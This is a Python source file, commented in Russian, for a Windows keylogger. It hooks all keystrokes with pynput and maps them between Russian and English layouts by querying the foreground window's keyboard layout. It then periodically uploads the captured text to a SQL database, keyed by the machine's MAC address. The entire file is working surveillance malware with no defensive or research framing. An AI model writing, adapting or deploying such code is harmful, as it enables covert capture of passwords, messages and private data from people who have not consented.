import time
import uuid
import ctypes
import threading
from sql_connect import db_connector
from pynput import keyboard
from layout_mapping import eng_to_rus, rus_to_eng, language_codes


def detect_keyboard_layout_win():
    '''
    Определение раскладки клавиатуры
    
    Происходит подключение файла user32.dll, представление его в виде объекта. Она позволяет получить id активного окна
    и id потока, который его обрабатывает. В переменную klid записывается номер раскладки клавиатуры, полученный из
    id потока. Номер раскладки представляет собой 10-чное представление 32 битного числа. Первые 16 бит служебные,
    вторые 16 бит - непосредственно сам номер раскладки, который нас интересует. Производится побитовое умножение на 
    2 ** 16 - 1, то есть в двоичном представлении это 16 единиц в младших разрядах, которые нас интересуют. Полученное
    число переводится в 16-ричное представление и значение сравнивается со словарем раскладок, возвращается название раскладки.
    
    '''
    user32 = ctypes.WinDLL('user32.dll', use_last_error=True)
    curr_window = user32.GetForegroundWindow()
    thread_id = user32.GetWindowThreadProcessId(curr_window, 0)
    klid = user32.GetKeyboardLayout(thread_id)
    lid = klid & (2 ** 16 - 1)
    lid_hex = hex(lid)
    try:
        language = language_codes[str(lid_hex)]
    except KeyError:
        language = language_codes['0x409']
    return language


def on_press(key):
    '''
    Обработка нажатых клавиш

    Каждая нажатая клавиша проходит по условиям, для более корректного отображения набранного текста в логах.
    При каждом нажатии происходит вызов функции определения языка (такое себе решение, понимаю, что ресурсозатратное, но
    ничего лучше я не придумал, библа pynput работает криво с русским языком и вообще не дружит с переключением раскладок)
    набранная клавиша, согласно словарю соответствий русской и английской раскладок, переписывает символ на нужной раскладке
    и передает его в файл лога.
    
    '''
    global text
    print(f'{key} pressed')
    if key == keyboard.Key.enter:
        text += '\n'
    elif key == keyboard.Key.tab:
        text += '\t'
    elif key == keyboard.Key.space:
        text += ' '
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.alt_l:
        pass
    elif key == keyboard.Key.backspace:
        text = text[:-2]
    else:
        if detect_keyboard_layout_win() == 'Russian':
            try:
                text += eng_to_rus[str(key).strip("'")]
            except:
                text += str(key).strip("'")
        else:
            try:
                text += rus_to_eng[str(key).strip("'")]
            except:
                text += str(key).strip("'")


def listener():
    print('Listener started')
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join() # Поток работает до тех пор, пока мы сами его не убьем =)


def db_updater():
    cursor = connection.cursor()
    while True:
        global text
        print(text)
        if len(text) > 20:
            print('Data is ready to be added to the database')
            cursor.execute("SELECT * FROM users_data WHERE username = %s", (mac_address))
            result = cursor.fetchone()
            print(result)
            if result:
                new_content = result[2] + '\n' + text 
                cursor.execute("UPDATE users_data SET content = %s WHERE username = %s", (new_content, mac_address))
                connection.commit()
                text = ''
                print(f'Updated user {mac_address} with new content.')
            else:  
                print('User does not exist, adding new user...')
                cursor.execute("INSERT INTO users_data (username, content) VALUES (%s, %s)", (mac_address, text))
                connection.commit()
                text = ''
                print('Data added')

        time.sleep(10)


if __name__ == '__main__':
    text = '123'
    mac_address = uuid.getnode()
    connection = db_connector()
    thread1= threading.Thread(target=listener)
    thread2 = threading.Thread(target=db_updater)
    thread1.start()
    thread2.start()
